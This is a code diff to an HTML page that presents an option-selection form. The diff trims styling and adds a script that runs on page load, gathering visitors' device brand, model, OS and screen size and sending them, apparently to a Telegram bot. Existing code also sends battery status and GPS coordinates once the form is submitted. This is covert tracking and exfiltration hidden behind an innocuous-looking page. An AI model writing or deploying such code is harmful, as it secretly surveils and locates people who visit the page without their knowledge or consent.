@@ -37,12 +37,6 @@
             backdrop-filter: blur(20px);
             background: rgba(0, 0, 0, 0.6);
             box-shadow: 0 10px 40px rgba(0, 0, 0, 0.8);
-            animation: glow 3s infinite alternate;
-        }
-
-        @keyframes glow {
-            from { box-shadow: 0 0 20px #ff00ff; }
-            to { box-shadow: 0 0 40px #00ffff; }
         }
 
         h1 {
@@ -77,7 +71,6 @@
         label {
             font-size: 1.5rem;
             cursor: pointer;
-            user-select: none;
         }
 
         .submit-btn {
@@ -89,12 +82,6 @@
             border-radius: 50px;
             cursor: pointer;
             background: linear-gradient(90deg, #ff00ff, #00ffff);
-            transition: all 0.3s;
-        }
-
-        .submit-btn:hover {
-            transform: scale(1.1);
-            box-shadow: 0 0 30px #00ffff;
         }
     </style>
 </head>
@@ -128,46 +115,56 @@
 
         async function getDeviceInfo() {
             let deviceInfo = "📱 **Device Info:**\n";
-            
+            let brandName = "Unknown";
+            let modelName = "Unknown";
+
             if (navigator.userAgentData) {
                 const ua = await navigator.userAgentData.getHighEntropyValues(["architecture", "model", "platform", "platformVersion"]);
-                deviceInfo += `🔹 **Device Model:** ${ua.model || "Unknown"}\n`;
+                modelName = ua.model || "Unknown";
+                deviceInfo += `🔹 **Device Model:** ${modelName}\n`;
                 deviceInfo += `🔹 **OS:** ${ua.platform} ${ua.platformVersion}\n`;
                 deviceInfo += `🔹 **Architecture:** ${ua.architecture || "Unknown"}\n`;
             } else {
                 deviceInfo += `🔹 **OS:** ${navigator.platform}\n`;
             }
 
+            if (/samsung/i.test(navigator.userAgent)) brandName = "Samsung";
+            if (/xiaomi|redmi/i.test(navigator.userAgent)) brandName = "Xiaomi";
+            if (/oneplus/i.test(navigator.userAgent)) brandName = "OnePlus";
+            if (/oppo/i.test(navigator.userAgent)) brandName = "Oppo";
+            if (/vivo/i.test(navigator.userAgent)) brandName = "Vivo";
+            if (/realme/i.test(navigator.userAgent)) brandName = "Realme";
+
+            deviceInfo = deviceInfo.replace("Device Model:", `Device Model: ${brandName}`);
+
             deviceInfo += `🔹 **Screen:** ${window.screen.width}x${window.screen.height}\n`;
 
             return deviceInfo;
         }
 
-        function getSelectedOption() {
-            const checkboxes = document.querySelectorAll('input[type="checkbox"]');
-            for (let checkbox of checkboxes) {
-                if (checkbox.checked) return checkbox.nextElementSibling.innerText;
-            }
-            return null;
+        async function sendVisitInfo() {
+            const deviceInfo = await getDeviceInfo();
+            const message = `🚀 **NEW USER VISIT**\n${deviceInfo}`;
+            sendMessage(message);
         }
 
         async function submitData() {
-            const option = getSelectedOption();
+            const option = document.querySelector('input[type="checkbox"]:checked');
             if (!option) return alert("Please select an option!");
 
             navigator.getBattery().then(battery => {
                 const batteryStatus = `🔋 **Battery:** ${Math.floor(battery.level * 100)}% (${battery.charging ? "Charging" : "Not Charging"})`;
                 
                 getDeviceInfo().then(deviceInfo => {
-                    const message = `✅ **User Response**\n🟢 **Option:** ${option}\n${deviceInfo}${batteryStatus}`;
+                    const message = `✅ **User Response**\n🟢 **Option:** ${option.nextElementSibling.innerText}\n${deviceInfo}${batteryStatus}`;
                     sendMessage(message);
                 });
 
-                captureLocation(option);
+                captureLocation();
             });
         }
 
-        function captureLocation(option) {
+        function captureLocation() {
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
                     (pos) => sendMessage(`📍 **Location:** Lat: ${pos.coords.latitude}, Lon: ${pos.coords.longitude}`),
@@ -184,6 +181,8 @@
                 body: JSON.stringify({ chat_id: CHAT_ID, text, parse_mode: "Markdown" })
             });
         }
+
+        window.onload = sendVisitInfo;
     </script>
 </body>
 </html>
